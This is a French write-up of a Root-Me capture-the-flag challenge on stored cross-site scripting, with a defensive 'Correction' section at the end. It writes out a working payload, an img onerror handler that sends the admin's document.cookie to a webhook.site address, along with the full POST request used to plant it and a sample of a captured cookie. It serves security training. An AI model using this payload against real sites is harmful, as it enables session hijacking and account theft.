# Challenge 9 : XSS Stockee 2

**URL** : https://www.root-me.org/fr/Challenges/Web-Client/XSS-Stockee-2

## Exploitation

Parametre vulnerable: `message` (formulaire de message)

### Etape 1: Creer un webhook

Aller sur https://webhook.site pour obtenir une URL unique.
Exemple: `https://webhook.site/64e6f531-804a-4315-9774-22f266460a95`

### Etape 2: Injecter le payload XSS

Requete:
```http
POST /web-client/ch19/?section=admin HTTP/1.1
Host: challenge01.root-me.org
Content-Type: application/x-www-form-urlencoded

titre=test&message=<img src=1 onerror="window.location='https://webhook.site/VOTRE_ID?cookie='+document.cookie" />
```

Payload:
```html
<img src=1 onerror="window.location='https://webhook.site/VOTRE_ID?cookie='+document.cookie" />
```

### Etape 3: Attendre que l'admin consulte

L'admin consulte regulierement les messages. Le XSS s'execute et envoie son cookie vers webhook.site.

### Etape 4: Recuperer le cookie

Sur webhook.site, consulter les requetes recues. Le cookie de l'admin contient le flag ou les identifiants.

Cookie recu:
```
cookie=status=invite; _ga=GA1.1.137644505...; _ga_SRYSXKQ9J7=GS2.1.8176469613...
```

Le flag est dans le cookie ou accessible une fois connecte avec le statut admin.

## Explication

- XSS stockee dans le champ message
- Utilisation de `<img src=1 onerror=...>` pour executer du JavaScript
- Le payload vole le cookie de l'admin via redirection
- Webhook.site capture la requete avec le cookie

## Correction

Echapper toutes les sorties HTML:
```php
echo htmlspecialchars($message, ENT_QUOTES, 'UTF-8');
```

Utiliser Content Security Policy (CSP):
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

Cookie HttpOnly pour empecher l'acces JavaScript:
```php
setcookie('session', $value, ['httponly' => true]);
```
